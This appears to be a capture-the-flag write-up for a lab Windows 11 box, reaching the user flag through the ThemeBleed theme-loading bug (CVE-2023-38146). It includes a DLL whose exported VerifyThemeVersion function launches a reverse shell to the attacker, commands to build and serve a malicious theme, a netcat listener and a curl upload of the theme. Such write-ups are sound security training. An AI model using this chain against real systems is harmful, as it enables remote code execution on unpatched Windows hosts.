## Overview

Aero is a medium-difficulty Windows 11 box built to showcase two 2023 CVEs. The front door is an IIS-hosted "Aero Theme Hub" that asks visitors to upload custom Windows 11 themes — and the host is unpatched against **ThemeBleed (CVE-2023-38146)**, a Windows Themes remote-code-execution bug. Crafting a malicious theme that references an attacker-controlled DLL, then letting the site's admin "test" it, lands a reverse shell as `aero\sam.emerson`. This post covers recon through the user flag.

CVE-defined box: ThemeBleed (CVE-2023-38146) is the entire foothold, but building the malicious VerifyThemeVersion DLL adds real custom effort; minimal enumeration on a single-port host.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 80/tcp | Microsoft IIS httpd 10.0 | "Aero Theme Hub", theme upload form |

```bash
nmap -A -Pn -sC -sV 10.10.10.X
```

A single open TCP port. The page advertises a "free, community driven, Windows 11 theme repository" and, importantly, says: *"As we start to develop our catalog of themes please upload your own to share with the community!"* — there is an Upload section that accepts theme files.

## Enumeration

The upload feature plus a Windows 11 theme focus is a strong hint. A quick search for `windows theme exploit` surfaces **ThemeBleed (CVE-2023-38146)**: Windows desktop themes (`.theme`) reference a visual-style file (`.msstyles`); when the style declares version `999`, Windows looks for a sibling DLL `<style>_vrf.dll`, verifies its Authenticode signature, and then loads it. The check and the load are separate reads of the same path — a time-of-check/time-of-use race. The DLL is expected to export `VerifyThemeVersion`. A ready-made PoC exists ([gabe-k/themebleed](https://github.com/gabe-k/themebleed)); building the malicious DLL requires a Windows VM with Visual Studio.

## Foothold

**1 — Build the malicious DLL.** In Visual Studio, create a Dynamic-Link Library project. Add a header declaring the required export:

```cpp
#pragma once
extern "C" __declspec(dllexport) int VerifyThemeVersion(void);
```

Implement it in a source file so `VerifyThemeVersion` calls a reverse shell (`rev_shell()`), a standard winsock connect-back that spawns `cmd.exe` pointed at the attacker IP/port:

```cpp
int VerifyThemeVersion(void) {
    rev_shell();   // winsock connect-back to <lhost>:<lport>, spawns cmd.exe
    return 0;
}
```

Include the new header in `pch.h`, build **x64 Release**, rename the output to `stage_3`, and drop it in the PoC's `data/` folder.

**2 — Craft the theme and start the ThemeBleed server.** From a PowerShell window on the Windows build box (disable the local "Server" service first to free port 445):

```powershell
.\ThemeBleed.exe make_theme <lhost> aero.theme
.\ThemeBleed.exe server
```

`make_theme` writes a malicious `aero.theme` pointed at the attacking machine; `server` serves the staged DLLs and wins the `_vrf.dll` race.

**3 — Start a listener and upload the theme.** On the attacker box:

```bash
nc -lvnp 10001
```

Then upload `aero.theme` through the site's Upload form:

```bash
curl -s -F "file=@aero.theme" http://10.10.10.X/upload
```

The server log walks through *stage 1 — Version check*, *stage 2 — Verify signature*, *stage 3 — LoadLibrary*, and the listener catches the callback.

## User flag

The reverse shell lands as `aero\sam.emerson`:

```
C:\Windows\system32>whoami
aero\sam.emerson
```

The user flag is at `C:\Users\sam.emerson\Desktop\user.txt`:

```powershell
type C:\Users\sam.emerson\Desktop\user.txt   # [redacted]
```

Foothold complete as `sam.emerson`.

Privilege escalation (the CLFS CVE-2023-28252 path hinted at by a PDF in the user's Documents) is left as an exercise — this post stops at user.
